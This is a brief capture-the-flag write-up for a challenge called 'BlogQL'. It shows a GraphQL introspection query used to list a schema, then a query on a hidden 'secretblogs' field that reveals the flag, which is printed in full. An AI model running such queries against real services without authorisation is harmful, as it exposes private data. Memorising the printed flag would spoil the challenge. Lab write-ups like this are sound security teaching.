# BlogQL<br />
after research and read chall content we will figure out it use graphql as database :)
## Target<br />
[\*] Get Flag :) <br />
## Solution<br />
First of all we know its uses graphql to make sure of that go to /graphql?query={PAYLOAD}<br />
we will search for payload to get all tables name so we can find where is the flag
`query {
  __schema {
    queryType {
      fields {
        name
        type {
          kind
          ofType {
            kind
            name
          }
        }
      }
    }
  }
}`<br />
after excute the payload above we will find this<br />
![](images/1.png)<br />
**Yeyyy.. We are too close :)**<br />
now all we have to do fetch all data from it :D<br>
`{
    secretblogs{
        content
    }
}`<br />
![](images/2.png)<br />
**flag : flag{ea6a3da74909e79a8aa38005c6810893_d1d_In7r0speC7i0n_wORk_F0r_gRaPhqL}**<br />